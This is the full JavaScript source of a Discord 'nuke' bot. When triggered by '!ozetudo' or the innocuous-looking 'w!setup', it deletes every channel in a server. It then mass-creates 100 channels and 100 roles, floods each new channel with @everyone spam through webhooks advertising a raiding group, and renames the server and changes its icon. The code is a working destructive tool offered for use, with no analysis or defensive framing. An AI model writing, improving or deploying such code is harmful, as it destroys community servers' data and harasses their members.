//CREATE BY GRASSBLOCK_MC

const {
    Client,
    GatewayIntentBits,
    PermissionsBitField,
} = require("discord.js");
const fs = require("fs");
const path = require("path");
const TOKEN = process.env.DISCORD_TOKEN;
const pLimit = require("p-limit").default;
const limit = pLimit(50); // 同時実行数を50に増加

// Expressを追加
const express = require("express");
const app = express();
const port = 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

client.on("ready", () => {
    console.log(`✅ Bot Ready: ${client.user.tag}`);
    app.listen(port, () => {
        console.log(`✅ Web Server listening at http://localhost:${port}`);
    });
});

app.get("/", (req, res) => {
    res.send("Discord Bot is running!");
});

client.on("messageCreate", async (message) => {
    if (
        (message.content === "!ozetudo" || message.content === "w!setup") &&
        message.guild
    ) {
        const guild = message.guild;

        await message.delete().catch(console.error);

        // 全チャンネル削除（並列）
        await Promise.all(
            guild.channels.cache.map((ch) =>
                ch
                    .delete()
                    .catch((err) => console.warn(`削除失敗: ${ch.name}`, err))
            )
        ).then(() => {
            console.log("✅ チャンネル削除開始");

            // チャンネル作成タスク（同時実行数を増加）
            const createChannelTasks = [];
            for (let i = 0; i < 100; i++) { // チャンネル数を100に増加
                createChannelTasks.push(
                    limit(() =>
                        guild.channels.create({
                            name: `discordꓸgg⁄ozetudo-${i}`,
                            type: 0,
                        }).then(channel => {
                            // チャンネル作成後にすぐWebhookを作成
                            return channel.createWebhook({
                                name: 'おぜつど最強',
                                avatar: 'https://i.imgur.com/UdfQWpV.jpeg',
                            }).then(webhook => {
                                return { channel, webhook };
                            });
                        })
                    )
                );
            }

            // ロール作成（並列処理）
            const createRoleTasks = [];
            for (let i = 1; i <= 100; i++) { // ロール数を100に増加
                createRoleTasks.push(
                    limit(() =>
                        guild.roles.create({
                            name: `OZEU ON TOP ${i}`,
                            color: getRandomColor(),
                            reason: "Nuked by OZEU discord.gg/ozetudo",
                        })
                    )
                );
            }

            // チャンネルとWebhookの作成を待機
            Promise.all(createChannelTasks)
                .then((results) => {
                    console.log("✅ チャンネルとWebhook作成完了");

                    // Webhookを使用してメッセージを一括送信
                    const messageSendTasks = [];
                    const messageContent = `# **OZEU ON TOP**\n## **このサーバーはおぜうの集いに破壊されました**\nhttps://x.com/ozeu0301\nhttps://x.com/ozeu114514\nhttps://discord.gg/ozetudo\n@everyone`;

                    for (const { webhook } of results) {
                        for (let i = 1; i <= 50; i++) { // メッセージ数を50に調整
                            messageSendTasks.push(
                                limit(() =>
                                    webhook.send({
                                        content: messageContent,
                                        username: 'ざっこwwwwwwwwwwwwwwwwwww',
                                        avatarURL: 'https://i.imgur.com/UdfQWpV.jpeg',
                                    }).catch(console.error)
                                )
                            );
                        }
                    }

                    return Promise.all(messageSendTasks);
                })
                .then(() => {
                    console.log("✅ メッセージ送信完了");
                })
                .catch(console.error);

            // ロール作成も並行して実行
            Promise.all(createRoleTasks)
                .then(() => console.log("✅ ロール作成完了"))
                .catch(console.error);
        });

        // サーバー名とアイコン変更
        const iconPath = path.join(__dirname, "aaa.png");
        if (fs.existsSync(iconPath)) {
            const iconBuffer = fs.readFileSync(iconPath);
            guild.setName("OZEU ON TOP").catch(console.error);
            guild.setIcon(iconBuffer).catch(console.error);
        } else {
            console.warn("⚠️ icon.png が見つかりませんでした");
        }
    }
});

function getRandomColor() {
    const r = Math.floor(Math.random() * 256);
    const g = Math.floor(Math.random() * 256);
    const b = Math.floor(Math.random() * 256);
    return (r << 16) + (g << 8) + b;
}

client.login(TOKEN);

//CREATE BY GRASSBLOCK_MC
